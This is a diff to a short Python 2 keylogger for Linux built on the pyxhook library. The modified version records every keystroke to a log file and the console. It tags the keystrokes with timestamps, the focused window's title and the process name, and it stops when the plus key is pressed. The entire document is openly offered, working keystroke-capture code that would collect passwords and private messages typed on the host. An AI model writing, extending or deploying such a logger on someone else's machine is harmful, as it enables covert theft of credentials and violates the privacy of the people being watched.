@@ -6,29 +6,65 @@ All rights reserved.
 A simple keylogger witten in python for linux platform
 All keystrokes are recorded in a log file.
 
-The program terminates when grave key(`) is pressed
+The program terminates when plus key(+) is pressed
 
-grave key is found below Esc key
+Modified by Mirko Conti.
+
 """
 
 import pyxhook
+from time import gmtime, strftime
+
 #change this to your log file's path
-log_file='/home/aman/Desktop/file.log'
+log_file='file.log'
+#name of the current focused window
+current_window=""
+#var of the open file
+of=""
 
-#this function is called everytime a key is pressed.
-def OnKeyPress(event):
-  fob=open(log_file,'a')
-  fob.write(event.Key)
-  fob.write('\n')
-
-  if event.Ascii==96: #96 is the ascii value of the grave key (`)
-    fob.close()
-    new_hook.cancel()
-#instantiate HookManager class
-new_hook=pyxhook.HookManager()
-#listen to all keystrokes
-new_hook.KeyDown=OnKeyPress
-#hook the keyboard
-new_hook.HookKeyboard()
-#start the session
-new_hook.start()
+def printOnFile(string):
+	global of
+	of=open(log_file,'a')
+	of.write(string)
+	
+#for debug use
+def printOnConsole(string):
+	print string
+	
+#get current date time
+def getDate():
+	return strftime("%Y-%m-%d %H:%M:%S : ", gmtime())
+    
+#when a button is pressed 
+def OnKeyPressConsol(event): 
+	global current_window
+	key = ""
+	if event.Ascii==0:
+		#to divide from normal test
+		key=" %s" % event.Key
+	else:
+		key=" %s" %event.Key
+	
+	if current_window==event.WindowName:
+		printOnFile(key)
+		printOnConsole(key)
+	else:
+		current_window = event.WindowName
+		log = "\n\n" + "-"*75 + "\n# " + getDate() + event.WindowName + " [ " + event.WindowProcName + " ]" + "\n" + "-"*75 + "\n" + key 
+		printOnFile(log)
+		printOnConsole(log)
+	if event.Ascii==43: #43 +
+		of.close()
+		new_hook.cancel()    
+	    
+#main function	  
+if __name__ == '__main__':
+	#instantiate HookManager class
+	new_hook=pyxhook.HookManager()
+	#hook the keyboard
+	new_hook.HookKeyboard()
+	#listen to all keystrokes
+	new_hook.KeyDown=OnKeyPressConsol
+	#start the session
+	new_hook.start()
+	
